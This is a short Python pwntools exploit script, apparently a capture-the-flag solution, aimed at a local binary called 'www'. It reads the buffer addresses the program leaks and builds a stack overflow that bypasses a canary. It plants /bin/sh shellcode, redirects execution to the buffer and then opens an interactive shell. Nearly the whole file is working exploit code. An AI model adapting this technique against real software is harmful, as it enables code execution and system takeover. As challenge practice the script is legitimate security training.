import re

import pwn


CANARY = 0x8049D68

USE_GDB = False

if USE_GDB:
    p = pwn.process(['gdb', './www'])
    _ = p.recvuntil('gdb-peda$ ')
    p.sendline('b strcmp')
    _ = p.recvuntil('gdb-peda$ ')
    p.sendline('r')
    # Adjust amount of recvlines if necessary.
    print p.recvline()
    print p.recvline()
    print p.recvline()
    print p.recvline()
else:
    p = pwn.process('./www')

_ = p.recvline()

buffer_line = p.recvline().rstrip('\n')
m = re.match(r"buffers at 0x([a-f0-9]+) and 0x([a-f0-9]+)", buffer_line)
b1_address = int(m.group(1), 16)
b2_address = int(m.group(2), 16)
pwn.log.info("Buffers at {:08x} and {:08x}".format(b1_address, b2_address))

# 16 bytes of local buffer, 9 bytes of canary, 0xc bytes of local crud
OVERFLOW_SIZE = 16 + 9 + 0xc

shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())
if '\x00' in shellcode:
    raise Exception("Null byte in shellcode.")
if len(shellcode) > OVERFLOW_SIZE:
    raise Exception("Shellcode too long.")


b1 = ""
b1 += shellcode.rjust(OVERFLOW_SIZE, 'a')
b1 += pwn.p32(0xdeadbeef)  # ebp control
b1 += pwn.p32(b1_address)  # eip control
b1 += pwn.p32(CANARY)  # copy dest address
b1 += pwn.p32(b2_address)  # copy source address

b2 = b1[16:]

p.sendline(b1)
p.sendline(b2)
_ = p.recvline()
_ = p.recvline()
_ = p.recvline()
_ = p.recvline()

pwn.log.info("Got shell!")
p.interactive()
